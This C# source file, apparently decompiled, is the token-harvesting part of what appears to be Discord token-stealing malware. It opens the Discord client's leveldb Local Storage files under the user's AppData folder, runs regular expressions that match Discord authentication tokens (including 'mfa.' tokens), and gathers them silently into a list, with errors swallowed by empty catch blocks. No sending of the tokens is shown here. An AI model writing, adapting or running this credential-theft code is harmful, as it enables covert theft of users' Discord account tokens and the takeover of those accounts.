using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text.RegularExpressions;

namespace hostik;

internal class Di
{
	public static List<string> dsL = new List<string>();

	public static void GetToken()
	{
		List<string> list = SearchForFile();
		if (list.Count == 0)
		{
			return;
		}
		foreach (string item in list)
		{
			dsL.Add(item + "\n");
		}
	}

	private static List<string> SearchForFile()
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile) + "\\AppData\\Roaming\\discord\\Local Storage\\leveldb");
		List<string> list = new List<string>();
		try
		{
			FileInfo[] files = directoryInfo.GetFiles("*.ldb");
			for (int i = 0; i < files.Length; i++)
			{
				string input = files[i].OpenText().ReadToEnd();
				foreach (Match item in Regex.Matches(input, "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}"))
				{
					list.Add(item.Value);
				}
				foreach (Match item2 in Regex.Matches(input, "mfa\\.[\\w-]{84}"))
				{
					list.Add(item2.Value);
				}
			}
		}
		catch
		{
		}
		return list.Distinct().ToList();
	}
}
